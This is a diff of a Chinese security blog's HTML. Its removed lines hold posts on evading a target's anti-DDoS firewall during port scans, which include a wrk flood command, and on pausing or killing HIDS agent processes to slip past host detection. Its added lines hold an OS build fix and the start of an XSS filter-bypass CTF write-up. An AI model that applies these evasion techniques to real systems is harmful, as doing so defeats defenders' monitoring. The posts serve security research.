1:5, ack 1, win 213, length 4</span><br><span class="line">23:59:20.671044 IP instance-fj5pftdp.34796 &gt; x.x.x.x.11935: Flags [F.], seq 5, ack 1, win 213, length 0</span><br><span class="line">23:59:20.709843 IP x.x.x.x &gt; instance-fj5pftdp: ICMP host x.x.x.x unreachable - admin prohibited, length 60</span><br><span class="line">23:59:20.742398 IP instance-fj5pftdp.34796 &gt; x.x.x.x.11935: Flags [F.], seq 5, ack 1, win 213, length 0</span><br><span class="line">23:59:20.978400 IP instance-fj5pftdp.34796 &gt; x.x.x.x.11935: Flags [FP.], seq 1:5, ack 1, win 213, length 4</span><br><span class="line">23:59:21.451408 IP instance-fj5pftdp.34796 &gt; x.x.x.x.11935: Flags [FP.], seq 1:5, ack 1, win 213, length 4</span><br><span class="line">23:59:22.397413 IP instance-fj5pftdp.34796 &gt; x.x.x.x.11935: Flags [FP.], seq 1:5, ack 1, win 213, length 4</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 第二次执行 echo 111 | nc  x.x.x.x 28328</span><br><span class="line">00:05:02.133562 IP instance-fj5pftdp.36738 &gt; x.x.x.x.11935: Flags [S], seq 3374266173, win 27200, options [mss 1360,sackOK,TS val 2945330600 ecr 0,nop,wscale 7], length 0</span><br><span class="line">00:05:02.168661 IP x.x.x.x &gt; instance-fj5pftdp: ICMP host x.x.x.x unreachable - admin prohibited, length 68</span><br></pre></td></tr></table></figure>
-
-<p>从数据包中可以看到一个奇怪的现象：</p>
+          <h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>今年年初(<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/mp/profile_ext?action=home&__biz=MzkzMzI3OTczNA==&scene=124#wechat_redirect">2021年我的学习计划</a>)我就计划补一下”操作系统”这门计算机专业课.</p>
+<p>最近我就在学一门网课，是极客时间的<a target="_blank" rel="noopener" href="https://time.geekbang.org/column/intro/100078401?tab=catalog">操作系统实战 45 讲</a>，感觉还可以：代码量是1w行多点，课程我就把它当做一个45讲的代码说明文档。</p>
+<p>网上也有一些类似的”实验教学”，比如：</p>
 <ul>
-<li>第一次执行命令时，服务端第一次返回syn-ack,第二次返回icmp不可达。</li>
-<li>第二次执行命令时，服务端直接返回icmp不可达。</li>
-<li>实际上第三次、第四次执行命令时，服务端也是直接返回icmp不可达。</li>
+<li><a target="_blank" rel="noopener" href="https://github.com/chyyuu/os_kernel_lab">kernel实验</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/sunym1993/flash-linux0.11-talk">linux0.11内核解读</a></li>
+<li><a target="_blank" rel="noopener" href="https://reactos.org/">reactos-操作系统</a></li>
 </ul>
-<p>另外多测试几次，有一个更奇怪的现象：</p>
+<p>目前我学习<a target="_blank" rel="noopener" href="https://gitee.com/lmos/cosmos">操作系统实战</a>有两个学习目标：</p>
 <ul>
-<li>扫描结果不稳定：有时显示大量端口开放、有时显示一个不固定的端口开放（比如44736）</li>
+<li>完全理解<a target="_blank" rel="noopener" href="https://gitee.com/lmos/cosmos/tree/master/lesson13/Cosmos">第十三课的代码</a>：十三课之前的内容包括了整个机器初始化过程</li>
+<li>完全理解<a target="_blank" rel="noopener" href="https://gitee.com/lmos/cosmos/tree/master/lesson25~26/Cosmos">第二十六课的代码</a>：比”十三课”内容多了”进程”和”内存”</li>
 </ul>
-<p>因此我想搞清楚以下问题：</p>
+<p>本文记录我在学习时遇到的第一个小问题：编译”第十三课的代码”时遇到一个报错</p>
+<p><img src="https://user-images.githubusercontent.com/1846319/141682853-e5976402-09ba-4478-aae6-4406e44c7dc3.png" alt="image"></p>
+<p>问题解决思路：</p>
 <ul>
-<li>为啥会出现两个上面奇怪的现象？<ul>
-<li>是否存在防火墙？</li>
-<li>防火墙的防护策略是啥？</li>
-</ul>
-</li>
-<li>怎么规避这种防火墙获取正确的端口信息？</li>
-</ul>
-<p>首先有三个非常肯定的前提：</p>
-<ul>
-<li>目标机器28328、44736等端口肯定是没有tcp监听的，只有80、22、3306等端口开放</li>
-<li>目标机器上用了firewalld，且是默认防护策略</li>
-<li>因为返回了syn-ack，所以syn扫描才误判成端口开放</li>
-</ul>
-<h1 id="什么是防火墙？"><a href="#什么是防火墙？" class="headerlink" title="什么是防火墙？"></a>什么是防火墙？</h1><p>  按照防火墙的位置，防火墙可以划分成：</p>
-<ul>
-<li><p>主机防火墙：运行在服务器上</p>
-</li>
-<li><p>硬件设备：串联或者旁路部署</p>
-<p>系统自带的主机防火墙包括：</p>
-</li>
-<li><p>iptables</p>
-</li>
-<li><p>firewalld</p>
-</li>
-<li><p>tcp wrappers</p>
-<p>这次目标主机上就运行着firewalld，当访问不存在的端口时，它会返回icmp包。</p>
-<p>除了系统自带的防火墙，很多甲方会基于snort、bro、suricata、ossec等开源项目做入侵检测系统。</p>
-<p>除了这些，各家乙方的ips、ddos等防护设备都有可能在存在。</p>
-<p>按照是否支持状态跟踪，防火墙可以划分成：</p>
-</li>
-<li><p>有状态防火墙</p>
-</li>
-<li><p>无状态防火墙（也叫”包过滤防火墙”）</p>
-<p>按照在osi七层模型的位置，防火墙也可以划分成：</p>
-</li>
-<li><p>四层防火墙</p>
-</li>
-<li><p>七层防火墙（主要是waf产品）</p>
-</li>
-</ul>
-<h1 id="先总结这次遇到的防火墙策略"><a href="#先总结这次遇到的防火墙策略" class="headerlink" title="先总结这次遇到的防火墙策略"></a>先总结这次遇到的防火墙策略</h1><p>小结：</p>
-<ul>
-<li><p>整条链路存在两个防火墙：</p>
-<ul>
-<li>一个是主机上的firewalld，默认策略</li>
-<li>另一个应该是部署在机房中</li>
-</ul>
-</li>
-<li><p>主机的firewalld防火墙，有如下特征：</p>
-<ul>
-<li>收到syn包，目的端口不存在时会返回icmp包</li>
-</ul>
-</li>
-<li><p>机房的防火墙可能是一台防ddos设备，有如下特征：</p>
-<ul>
-<li><p>不是rst方式、首包丢弃等方式的防火墙；也不是基于”陷阱端口”</p>
-</li>
-<li><p>当频率到达阈值时，会开启”源认证”</p>
-</li>
-<li><p>通过”源认证”会暂时加白；如果频率再次触发阈值，就会再次开启”源认证”</p>
-</li>
-<li><p>有ip拉黑机制，被拉黑后，一段时间内客户端发出的syn、ack包不会收到任何回包</p>
-</li>
-<li><p>不拦截长度大于0的udp包</p>
-</li>
-</ul>
-</li>
+<li>搞清楚”编译器”去哪里找”kernel.inc”文件</li>
 </ul>
 <h1 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h1><ul>
-<li><p>判断是否存在防火墙？</p>
-<p>现象一：</p>
-<p><code>nc x.x.x.x 不存在的端口</code>时，响应icmp包。</p>
-<p>基于如下两个原因可以推断出存在防火墙</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">* 一般来说，向操作系统不存在的端口发送tcp syn包时，会收到操作系统的rst包</span><br><span class="line">* 似乎只有防火墙喜欢返回icmp包</span><br></pre></td></tr></table></figure>
+<li><p>最简便的方法找到”kernel.inc”文件位置</p>
+<p>strace -f可以跟踪子进程的系统调用</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-fj5pftdp Cosmos]# strace -f make 2&gt;&#x2F;tmp&#x2F;q.txt</span><br><span class="line">[root@instance-fj5pftdp Cosmos]# cat &#x2F;tmp&#x2F;q.txt</span><br><span class="line">...</span><br><span class="line">[pid 20451] open(&quot;kernel.inc&quot;, O_RDONLY) &#x3D; -1 ENOENT (没有那个文件或目录)</span><br><span class="line">[pid 20451] open(&quot;..&#x2F;includekernel.inc&quot;, O_RDONLY) &#x3D; -1 ENOENT (没有那个文件或目录)</span><br><span class="line">[pid 20451] open(&quot;..&#x2F;include&#x2F;bastypeinckernel.inc&quot;, O_RDONLY) &#x3D; -1 ENOENT (没有那个文件或目录)</span><br><span class="line">[pid 20451] open(&quot;..&#x2F;include&#x2F;halinckernel.inc&quot;, O_RDONLY) &#x3D; -1 ENOENT (没有那个文件或目录)</span><br><span class="line">[pid 20451] open(&quot;..&#x2F;include&#x2F;knlinckernel.inc&quot;, O_RDONLY) &#x3D; -1 ENOENT (没有那个文件或目录)</span><br><span class="line">[pid 20451] open(&quot;..&#x2F;include&#x2F;libinckernel.inc&quot;, O_RDONLY) &#x3D; -1 ENOENT (没有那个文件或目录)</span><br><span class="line">[pid 20451] open(&quot;..&#x2F;include&#x2F;drvinckernel.inc&quot;, O_RDONLY) &#x3D; -1 ENOENT (没有那个文件或目录)</span><br><span class="line">[pid 20451] write(2, &quot;..&#x2F;hal&#x2F;x86&#x2F;kernel.asm:6: &quot;, 25..&#x2F;hal&#x2F;x86&#x2F;kernel.asm:6: ) &#x3D; 25</span><br></pre></td></tr></table></figure>
 
-<p>现象二：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">nmap工具扫描前：可以ping通，curl 80可以访问</span><br><span class="line"></span><br><span class="line">nmap工具扫描后，ping和curl都无法访问</span><br><span class="line"></span><br><span class="line">过一段时间后：又可以ping通，curl 80也可以访问</span><br></pre></td></tr></table></figure>
-
-<p>说明防火墙有黑名单机制。</p>
-<p>结论：确认存在防火墙，且有黑名单ip机制</p>
-</li>
-<li><p>判断防火墙是否有”握手时rst”、首包丢弃等行为</p>
-<p>思路：<br>连接提供tcp服务的端口并抓包，查看是否有rst，首包丢弃等行为</p>
-<p>过程：</p>
-<p>执行<code>echo | nc x.x.x.x 80</code>，并抓包</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-fj5pftdp ~]# tcpdump -i eth0 &#39;host  x.x.x.x&#39;</span><br><span class="line">...</span><br><span class="line">18:15:53.547200 IP instance-fj5pftdp.51400 &gt; x.x.x.x.http: Flags [S], seq 468920486, win 27200, options [mss 1360,sackOK,TS val 2405982013 ecr 0,nop,wscale 7], length 0</span><br><span class="line">18:15:53.579860 IP x.x.x.x.http &gt; instance-fj5pftdp.51400: Flags [S.], seq 3601120884, ack 468920487, win 14480, options [mss 1460,sackOK,TS val 556123394 ecr 2405982013,nop,wscale 7], length 0</span><br><span class="line">18:15:53.579943 IP instance-fj5pftdp.51400 &gt; x.x.x.x.http: Flags [.], ack 1, win 213, options [nop,nop,TS val 2405982046 ecr 556123394], length 0</span><br><span class="line">18:15:53.580084 IP instance-fj5pftdp.51400 &gt; x.x.x.x.http: Flags [P.], seq 1:2, ack 1, win 213, options [nop,nop,TS val 2405982046 ecr 556123394], length 1: HTTP</span><br><span class="line">18:15:53.580097 IP instance-fj5pftdp.51400 &gt; x.x.x.x.http: Flags [F.], seq 2, ack 1, win 213, options [nop,nop,TS val 2405982046 ecr 556123394], length 0</span><br><span class="line">18:15:53.611613 IP x.x.x.x.http &gt; instance-fj5pftdp.51400: Flags [.], ack 2, win 114, options [nop,nop,TS val 556123427 ecr 2405982046], length 0</span><br><span class="line">18:15:53.611895 IP x.x.x.x.http &gt; instance-fj5pftdp.51400: Flags [F.], seq 1, ack 3, win 114, options [nop,nop,TS val 556123427 ecr 2405982046], length 0</span><br><span class="line">18:15:53.611924 IP instance-fj5pftdp.51400 &gt; x.x.x.x.http: Flags [.], ack 2, win 213, options [nop,nop,TS val 2405982078 ecr 556123427], length 0</span><br></pre></td></tr></table></figure>
-
-<p>可以看到，总共八个包：前三个握手、后四个挥手、中间一个包传tcp数据。</p>
-<p>中间并没有rst，首包syn也并没有被丢。</p>
-<p>结论：</p>
-<ul>
-<li>不是rst方式的防火墙</li>
-<li>不是首包丢弃的防火墙</li>
-</ul>
-</li>
-<li><p>判断防火墙是否syn-ack代理</p>
-<p>思路：在未被拉黑时，向x.x.x.x不存在tcp服务的端口发送syn包，如果能收到syn-ack，就说明防火墙做了syn-ack代理</p>
-<p>结论：防火墙没有syn-ack代理功能</p>
-</li>
-<li><p>拉黑后客户端发包能收到什么？</p>
-<p>经过测试，ip被拉黑后：</p>
-<ul>
-<li>客户端发出去的syn包、ack包得不到任何响应</li>
-<li>udp包可以正常通过（traceroute可以收到icmp回包）</li>
-</ul>
-</li>
-<li><p>什么时候会被防火墙拉黑？</p>
-<p>简单来说，存在两种可能性：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">* 频率超过一定限制 (主流的做法)</span><br><span class="line">* 扫到&quot;陷阱端口&quot;  (非主流的做法)</span><br></pre></td></tr></table></figure>
-
-<p>“陷阱端口”的概念见<a target="_blank" rel="noopener" href="https://github.com/EtherDream/anti-portscan">anti-portscan</a></p>
-<p>向80端口高频发出syn包，过了一会就被拉黑了。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -ti --rm docker.io&#x2F;williamyeh&#x2F;wrk -t4  -c40000 -d 10000 http:&#x2F;&#x2F;x.x.x.x</span><br></pre></td></tr></table></figure>
-
-<p>基于下面四点原因，可以排除”陷阱端口”这种防御检测方式。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">* &quot;陷阱端口&quot;这种方式比较复杂、比较非主流</span><br><span class="line">* 因为可能和业务端口冲突，所以部署在机房中的硬件防火墙不太可能基于&quot;陷阱端口&quot;检测</span><br><span class="line">* 后面确认了目标Linux系统上用了firewalld防火墙，主机上并没有&quot;陷阱端口&quot;这种机制</span><br><span class="line">* 测试结果表明 &quot;频率超过一定限制&quot; 后，ip就被拉黑了</span><br></pre></td></tr></table></figure>
-
-<p>结论：基于频率封禁ip</p>
+<p>可以发现 <code>../includekernel.inc</code>等路径少了一个<code>/</code>符号</p>
+<p>修改后，就编译成功了</p>
+<p><img src="https://user-images.githubusercontent.com/1846319/141683341-8053e5e0-850c-437f-9105-94ae1a4809fe.png" alt="image"></p>
 </li>
 </ul>
-<h1 id="为什么会出现问题背景中的奇怪现象"><a href="#为什么会出现问题背景中的奇怪现象" class="headerlink" title="为什么会出现问题背景中的奇怪现象"></a>为什么会出现问题背景中的奇怪现象</h1><ul>
-<li><p>为什么防火墙会返回syn-ack？</p>
-<p>如前面的分析，防火墙虽然没有syn-ack代理功能，但是在扫描端口时，目的端口不存在服务的syn包却收到了syn-ack响应。</p>
-<p>换句话说，就是”syn包频率过快”时，就会收到大量的syn-ack响应。</p>
-<p>虽然知道了这个现象，但是不清楚为啥会这样。问人和查资料后，在<a target="_blank" rel="noopener" href="https://forum.huawei.com/enterprise/zh/thread-373115.html">【华安解密之DDoS攻防】11 TCP原理篇之SYN Flood</a>找到一些线索。</p>
-<p>如文中所说，ddos设备会做源认证来识别客户端是否合法，此时就会响应syn-ack包。</p>
-<p>所以，当扫描端口时，”syn包频率过快”，引起ddos设备做源认证。</p>
-<p>因为一直没有回ack包，所以一直没有通过源认证。</p>
-<p>因为没有通过源认证，同时又在不断的发syn包，所以ddos设备会接着做认证，不断地回syn-ack包。这个时候ddos设备也不会拉黑ip。</p>
-</li>
-<li><p>为什么防火墙会返回syn-ack和icmp呢？</p>
-<p>有了上面的理解，这里也容易猜了。</p>
-<p>估计是执行<code>echo 111 | nc x.x.x.x 28328</code>时，此时正处于源认证阶段，客户端执行命令刚好能完成正常的三次握手，被识别成正常客户端，因此ddos设备把客户端加白了。</p>
-<p>加白后，包转发到后端目标机器上。目标机器因为firewalld防火墙，所以返回icmp包</p>
-</li>
-<li><p>为什么”扫描结果不稳定：有时显示大量端口开放、有时显示一个不固定的端口开放（比如44736）”？</p>
-<p>经过测试后，准确的说现象应该是：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1. masscan扫描，然后发现大量端口开放</span><br><span class="line">2. nc完成一次正常连接</span><br><span class="line">3. masscan再次扫描，然后发现ip被拉黑，并且结果中显示有一个开放端口（此端口号不固定）</span><br></pre></td></tr></table></figure>
-
-<p>估摸着，ddos安全策略如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1. 客户端用masscan扫描，触发源认证</span><br><span class="line">2. nc完成正常连接，通过源认证。此时设备将客户端加白</span><br><span class="line">3. 客户端用masscan再次扫描，因为客户端已经加白了，同时syn包频率异常，所以设备需要再次验证客户端是否正常，不过这次只回一次syn-ack包</span><br><span class="line">4. 客户端masscan 因为收到一次syn-ack包，所以显示有一个端口开放。同时masscan回rst包</span><br><span class="line">5. 设备收到rst包后，认为客户端是恶意的，直接拉黑</span><br></pre></td></tr></table></figure>
-
-</li>
-</ul>
-<h1 id="怎么规避这种防火墙获取到正确的端口信息？"><a href="#怎么规避这种防火墙获取到正确的端口信息？" class="headerlink" title="怎么规避这种防火墙获取到正确的端口信息？"></a>怎么规避这种防火墙获取到正确的端口信息？</h1><p>最简单的一种规避手段：如果目标ip足够多，masscan/nmap扫时随机化扫描地址，就应该到不了频率阈值。</p>
-<p>照这个想法，按理说fofa、钟馗之眼 等空间绘测产品应该能准确识别开放端口。验证了一下：有两三个不该显示的端口、实际开放的端口也并没有获取完全（可能是数据更新的问题）。</p>
-<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>在这个案例中，主要整清楚了：</p>
-<ul>
-<li>链路上有哪些防火墙？<ul>
-<li>主机防火墙firewalld，策略是默认策略，比较简单</li>
-<li>机房中的防ddos设备</li>
-</ul>
-</li>
-<li>防ddos设备的防护策略有哪些？<ul>
-<li>源认证</li>
-<li>首包丢弃</li>
-<li>握手时rst</li>
-</ul>
-</li>
-<li>什么时候会触发防护策略？<ul>
-<li>频率达到阈值</li>
-</ul>
-</li>
-<li>触发防护策略后会发生啥？<ul>
-<li>要不拉黑；要不就暂时加白</li>
-</ul>
-</li>
-</ul>
-<p>另外可以在云厂商控制台上看看云上抗ddos产品的功能和文档，也能了解ddos产品防护策略有哪些，虽然可能不全。</p>
-<p>如果发现内容结论有问题，请后台联系我。</p>
-<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a target="_blank" rel="noopener" href="https://github.com/nmap/nmap/issues/1904">从nmap的issue看到有人遇到同样问题</a></p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p><code>strace -f</code> 真香：不需要我去研究”代码”或者”编译器”是怎么包含”kernel.inc文件”。</p>
 
       
     </div>
@@ -794,7 +560,7 @@ Nginx提供 `lua_regex_match_limit` 指令限制回溯次数</code></pre>
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-%E5%A6%82%E4%BD%95%E7%BB%93%E6%9D%9F%E5%92%8C%E6%9A%82%E5%81%9Cagent%E8%BF%9B%E7%A8%8B/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-%E7%A5%9E%E5%A5%87%E7%9A%84javascript-%E4%B8%8D%E7%94%A8%E6%8B%AC%E5%8F%B7%E5%B8%A6%E5%8F%82%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -807,7 +573,7 @@ Nginx提供 `lua_regex_match_limit` 指令限制回溯次数</code></pre>
     </span>
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
-          <a href="/2021-12-26-%E5%A6%82%E4%BD%95%E7%BB%93%E6%9D%9F%E5%92%8C%E6%9A%82%E5%81%9Cagent%E8%BF%9B%E7%A8%8B/" class="post-title-link" itemprop="url">如何结束和暂停agent进程</a>
+          <a href="/2021-12-26-%E7%A5%9E%E5%A5%87%E7%9A%84javascript-%E4%B8%8D%E7%94%A8%E6%8B%AC%E5%8F%B7%E5%B8%A6%E5%8F%82%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0/" class="post-title-link" itemprop="url">神奇的javascript-不用括号带参执行函数</a>
         </h2>
 
         <div class="post-meta-container">
@@ -831,86 +597,124 @@ Nginx提供 `lua_regex_match_limit` 指令限制回溯次数</code></pre>
     
     
     <div class="post-body" itemprop="articleBody">
-          <h1 id="问题背景"><a href="#问题背景" class="headerlink" title="问题背景"></a>问题背景</h1><p>就像 <a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/WQeOfZtyKndbDebe66-V_g">如何避免文件上报-制作大文件</a> 说的，hids agent会上报很多信息，安全防护策略也是围绕”agent上报的信息”制定的。</p>
-<p>那如果攻击者”结束、暂停agent进程”，导致agent功能废掉，是不是就能够绕过hids的防护呢？</p>
-<p>研究过程中，我发现并不能轻易地结束agent进程；”结束和暂停agent进程”会带来”心跳失联”的异常特征，可能引起”运营人员”的注意从而导致攻击行为暴露。</p>
-<p>本文主要讨论以下问题：</p>
-<ul>
-<li>怎么结束agent进程？</li>
-<li>怎么暂停agent进程？</li>
-<li>“心跳失联”</li>
-</ul>
-<h1 id="结束agent进程"><a href="#结束agent进程" class="headerlink" title="结束agent进程"></a>结束agent进程</h1><ul>
-<li><p>怎么结束agent进程？</p>
-<p>在linux上执行 <code>kill -SIGKILL 进程号</code> 是一定可以结束进程的，因为 SIGKILL信号不能被忽略或者做其他处理。</p>
-<p>但是我们杀掉hids agent进程后，agent进程会自动重启。</p>
-</li>
-<li><p>怎么实现”挂掉自动重启”？</p>
-<p>经过调研，”挂掉自动重启”机制在linux最常见的实现方式包括：</p>
-<blockquote>
-<p>通过 systemd、supervisord 等实现</p>
-<p>crond：通过计划任务</p>
-<p>watchdog</p>
-</blockquote>
-<p><a target="_blank" rel="noopener" href="https://github.com/bytedance/Elkeid/blob/main/server/docs/quick-start-zh_CN.md">字节hids文档</a> 推荐的也是”systemd”和”crond”这两种方式。</p>
-<p><img src="https://images.gitee.com/uploads/images/2021/0923/234007_74229bc1_83508.png" alt="字节hids文档" title="屏幕截图.png"></p>
-<p>有对supervisord、systemd实现原理感兴趣的，可以看最后一节。</p>
-</li>
-<li><p>怎么结束被systemd、supervisord管理的进程？</p>
-<p>supervisord和systemd等管理的进程可以通过”supervisorctl”和”systemctl”等命令关掉。</p>
-<p>这两命令实际也是通过”本地socket通信”告诉supervisord和systemd结束进程，所以当没有办法使用”supervisorctl”和”systemctl”命令时，也可以编写程序直接和”本地socket文件”通信。</p>
-</li>
-</ul>
-<h1 id="暂停agent进程"><a href="#暂停agent进程" class="headerlink" title="暂停agent进程"></a>暂停agent进程</h1><ul>
-<li><p>怎么暂停agent进程？</p>
-<p>向进程发送SIGSTOP、SIGTSTP、SIGTTIN等信号都可能暂停进程，推荐用SIGSTOP信号，原因是进程收到其他信号还能忽略，收到SIGSTOP信号却只能暂停进程。</p>
-<p>这个结论可以在<code>man 7 signal</code>看到</p>
-<blockquote>
-<p>The signals SIGKILL and SIGSTOP cannot be caught, blocked, or ignored.</p>
-</blockquote>
-</li>
-</ul>
-<ul>
-<li><p>“暂停的agent进程”是否会被自动重启或者恢复运行状态？</p>
-<p>这里还存在一个小问题：当子进程被暂停或者结束时，父进程是可以收到SIGCHLD信号的。那systemd遇到子进程暂停时，会不会重启进程？</p>
-<p>经过测试和源码对比，我的结论是：systemd不会。</p>
-</li>
-<li><p>测试某hids</p>
-<p>经过对某hids做测试，发现stop状态的agent进程会被恢复成运行状态。</p>
-<p>agent进程的父进程的父进程才是systemd，所以估计是agent父进程收到SIGCHLD信号后向agent进程发送了SIGCONT信号恢复运行状态。</p>
-<p>当把hids所有的agent进程都暂停后，符合预期：所有agent进程一直被暂停。</p>
-</li>
-</ul>
-<h1 id="“心跳失联”的问题"><a href="#“心跳失联”的问题" class="headerlink" title="“心跳失联”的问题"></a>“心跳失联”的问题</h1><ul>
-<li><p>“心跳失联”是什么？</p>
-<p>正常情况下，agent按照一定频率会发送”心跳包”告诉server自己存活。</p>
-<p>如果”结束和暂停agent进程”，就会影响到”心跳包”的发送。进而server端是可以感知到agent异常的。</p>
-<p>这种异常可能引起”运营人员”的注意从而导致攻击行为暴露。</p>
-</li>
-<li><p>怎么解决”心跳失联”的问题？</p>
-<p>凭空想象的一种解决方法：恶意样本 先暂停agent进程，等到恶意行为完成后，再恢复agent进程。</p>
-<p>这样心跳也存在，也有可能绕过hids防护。</p>
-</li>
-</ul>
-<h1 id="systemd是怎么知道”进程挂掉”？"><a href="#systemd是怎么知道”进程挂掉”？" class="headerlink" title="systemd是怎么知道”进程挂掉”？"></a>systemd是怎么知道”进程挂掉”？</h1><p>先说我验证的结论：</p>
-<ul>
-<li>systemd为sigchild信号注册了一个处理函数，函数内部调用waitid处理退出的子进程。</li>
-<li>当systemd管理的进程退出时，systemd进程会收到sigchild信号，进而跳转到处理函数。</li>
-</ul>
-<p>从<a target="_blank" rel="noopener" href="https://github.com/systemd/systemd/blob/71a80dcc0b64b01c73e7141c4292ef301543a011/src/core/manager.c">systemd源码</a>可以看到manager_setup_sigchld_event_source函数就是”sigchild信号的处理函数”。<br><img src="https://images.gitee.com/uploads/images/2021/0923/234046_4aa2c450_83508.png" alt="输入图片说明" title="屏幕截图.png"></p>
-<p>如果systemd进程号为1，也可以通过<code>strace -p 1</code>来验证结论：</p>
-<p>结束systemd管理的进程时（下面例子中是83206号进程），可以看到waitid系统调用</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">waitid(P_ALL, 0, &#123;si_signo&#x3D;SIGCHLD, si_code&#x3D;CLD_KILLED, si_pid&#x3D;83206, si_uid&#x3D;0, si_status&#x3D;SIGKILL, si_utime&#x3D;0, si_stime&#x3D;0&#125;, WNOHANG|WEXITED|WNOWAIT, NULL) &#x3D; 0</span><br><span class="line">...</span><br><span class="line">waitid(P_PID, 83206, &#123;si_signo&#x3D;SIGCHLD, si_code&#x3D;CLD_KILLED, si_pid&#x3D;83206, si_uid&#x3D;0, si_status&#x3D;SIGKILL, si_utime&#x3D;0, si_stime&#x3D;0&#125;, WEXITED, NULL) &#x3D; 0</span><br><span class="line">waitid(P_ALL, 0, &#123;&#125;, WNOHANG|WEXITED|WNOWAIT, NULL) &#x3D; 0</span><br></pre></td></tr></table></figure>
+          <h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>两周前，我遇到一个挺有意思的xss，过滤了很多符号，包括<code>&lt;&gt;=()`[]</code>等。</p>
+<p>我将此问题抽象成<a target="_blank" rel="noopener" href="https://04bdb3a0.o53.xyz/a1e60ae3-4bac-4012-a0f3-5b7018677979.php?a=1">ctf题目</a>，题目源码公开在 <a target="_blank" rel="noopener" href="https://gist.github.com/leveryd/40fcaed60727b6163b034145e332640f">github</a>。</p>
+<p>前两天在 <a target="_blank" rel="noopener" href="https://gist.github.com/leveryd/40fcaed60727b6163b034145e332640f">题目评论</a> 中看到有师傅把答案贴出来了，我就说一下这个案例。</p>
+<h1 id="测试时遇到的问题"><a href="#测试时遇到的问题" class="headerlink" title="测试时遇到的问题"></a>测试时遇到的问题</h1><p>实际测试时遇到的问题，也是题目中有两个比较难的地方：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">* javascript不用 &lt;&gt;&#x3D;()&#96;[] 等符号，怎么调用函数？</span><br><span class="line">* javascript不用 &lt;&gt;&#x3D;()&#96;[] 等符号，怎么调用函数，并且带上参数？</span><br></pre></td></tr></table></figure>
 
-<p>supervisord和systemd有点类似，不一样的是supervisord似乎只用wait等系统调用，来判断子进程是否已经退出。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-fj5pftdp ~]# ps aux|grep supervi</span><br><span class="line">root     13170  0.0  0.0  56368 12760 ?        Ss   6月01  71:47 &#x2F;usr&#x2F;bin&#x2F;python &#x2F;usr&#x2F;bin&#x2F;supervisord -c &#x2F;data&#x2F;poc-web-api&#x2F;docker&#x2F;supervisor.conf</span><br><span class="line">[root@instance-fj5pftdp ~]# strace -p 13170 2&gt;&amp;1 | grep -i wait</span><br><span class="line">...</span><br><span class="line">wait4(-1, 0x7fffbe389d9c, WNOHANG, NULL) &#x3D; 0</span><br><span class="line">wait4(-1, 0x7fffbe389d9c, WNOHANG, NULL) &#x3D; 0</span><br><span class="line">wait4(-1, 0x7fffbe389d9c, WNOHANG, NULL) &#x3D; 0</span><br><span class="line">wait4(-1, [&#123;WIFSIGNALED(s) &amp;&amp; WTERMSIG(s) &#x3D;&#x3D; SIGKILL&#125;], WNOHANG, NULL) &#x3D; 5557</span><br></pre></td></tr></table></figure>
